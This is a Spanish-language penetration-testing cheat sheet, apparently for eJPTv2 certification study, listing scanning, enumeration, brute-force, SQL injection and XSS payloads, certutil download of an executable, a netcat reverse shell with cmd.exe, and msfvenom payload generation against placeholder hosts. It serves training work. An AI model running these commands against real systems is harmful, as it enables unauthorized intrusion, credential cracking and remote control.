# CheatSheet - eJPTv2 (en mejora completamente)

### Índice:
- [Comandos básicos](#comandos-básicos)
- [Enumeración de OS](#enumeración-de-os-sistema-operativo)
- [Puertos y servicios por defecto](#puertos-y-servicios-por-defecto)
- [Enumeración de hosts](#enumeración-de-hosts)
- [Escaneo de puertos y servicios](#escaneo-de-puertos-y-servicios)
- [Enumeración web](#enumeracion-web)
- [Fuerza bruta](#fuerza-bruta)
- [Ataques SQLi](#sql-injection)
- [Ataques XSS](#ataques-xss)
- [SMB](#smb)
- [FTP](#ftp)
- [Cracking de contraseñas](#password-cracking)
- [Transferencia de archivos](#transferir-archivos)

# Comandos básicos
| **Comando** | **Descripción** |
|-------------|-----------------|
| `sudo openvpn user.ovpn` | Conectarte por VPN |
| `ifconfig` / `ip a` | Ver las direcciones IP de tu máquina |
| `netstat -rn` | Ver rutas y conexiones vía VPN |
| `ssh user@10.10.10.10` | Conectarte por SSH |
| `ftp 10.10.10.10 -p 22` | Conectarte a un servidor FTP |

# Enumeración de OS (Sistema operativo)
| **Comando** |
|-------------|
| `ping -c 2 10.10.10.10` |

| **Dispositivo (OS)** | **TTL** |
|----------------------|---------|
| Linux/Unix           | 64      |
| Windows              | 128     |
| Solaris/AIX          | 254     |

# Puertos y servicios por defecto
| **Puerto** | **Servicio** |
|------------|--------------|
| 25         | SMTP         |
| 22         | SSH          |
| 110        | POP3         |
| 143        | IMAP         |
| 80         | HTTP         |
| 443        | HTTPS        |
| 137,138,139| NETBIOS      |
| 21         | FTP          |
| 3306       | MySQL        |
| 3389       | RDP          |

# Enumeración de hosts
| **Comando** | |
|-------------|-----------------|
| `fping` | `sudo fping -a -g 10.10.10.10/24 2>/dev/null` |
| `nmap` | `nmap -sn 10.10.10.10/24` |

# Escaneo de puertos y servicios
| **Comando** |
|-------------|
| **nmap** |
| `nmap -p- -sS --min-rate 5000 -Pn -n 10.10.10.10` |
| `nmap -p21,22,80 -sCV 10.10.10.10 -oN servicesScan` |
| **masscan** |
| `sudo masscan -p 21,22,80 --rate 64000 --open-only -oG masscan.gnmap 10.10.10.10/24` |

# Enumeración web
| **Comando** |
|-------------|
| **whatweb** | `whatweb http://10.10.10.10` |
| **gobuster** | `gobuster dir -w /opt/wordlist.txt -u http://10.10.10.10/` |
| **dirb** | `dirb http://10.10.10.10/` |
| **nikto** | `nikto -host http://10.10.10.10` |

# Fuerza bruta
| **Comando** |
|-------------|
| **hydra** | `hydra -L users.txt -P /usr/share/wordlist/rockyou.txt ejemplo.com http /admin/` |
| **john** | `john --wordlist=/usr/share/wordlists/rockyou.txt crack.hash` |
| **hashcat** | `hashcat -m 1000 crack.hash /usr/share/wordlists/rockyou.txt` |

# SQL Injection
| **Comando** |
|-------------|
| `sqlmap -u "http://10.10.10.10/file.php?id=1" --dbs` |
| `OR 1=1 -- -` |
| `UNION SELECT 1,2,3--` |

# Ataques XSS
| **Comando** |
|-------------|
| `<script>alert('xss')</script>` |
| `<h1>H1</h1>` |

# SMB
## Enumeración SMB
| **Comando** |
|-------------|
| `smbclient -L 10.10.10.10 -N` |
| `smbmap -H 10.10.10.10 -u "null"` |
| `nmap --script=smb-vuln* -p445 10.10.10.10` |

## Acceso a recursos SMB
| **Comando** |
|-------------|
| `smbclient //10.10.10.10/backups` |

# FTP
## Enumeración FTP
| **Comando** |
|-------------|
| `nmap --script=ftp-anon -p21 10.10.10.10` |
| `ftp 10.10.10.10` |

## FTP - Fuerza bruta
| **Comando** |
|-------------|
| `hydra -L userlist.txt -P passlist.txt ftp://10.10.10.10` |

# Cracking de contraseñas
| **Comando** |
|-------------|
| **john** | `john --wordlist=/usr/share/wordlists/rockyou.txt hashes.txt` |
| **hashcat** | `hashcat -m TYPE crack.hash /usr/share/wordlists/rockyou.txt` |

# Transferir archivos
| **Comando** |
|-------------|
| **Certutil** | `certutil -urlcache -f http://10.10.10.10/test.exe test.exe` |
| **SCP** | `scp /path/to/file username@remote:/path/to/destination` |
| **HTTP** | `python3 -m http.server 8080` |

# Reverse Shell
## Netcat
| **Comando** |
|-------------|
| `nc -nlvp 443` |
| `nc.exe 10.10.10.10 444 -e cmd.exe` |

## Metasploit
| **Comando** |
|-------------|
| `msfvenom -p windows/shell_reverse_tcp LHOST=10.10.10.10 LPORT=443 -f exe > shell.exe` |
| `msfconsole` |

# Post Explotación
## Pivoting
| **Comando** |
|-------------|
| `ip route add 10.10.16.0/24 via 10.10.16.1 dev tap0` |
| `run autoroute -s 10.10.16.0/24` |

# Wireshark
| **Comando** |
|-------------|
| `ip.addr == 192.168.12.1` |
| `tcp.port == 80` |
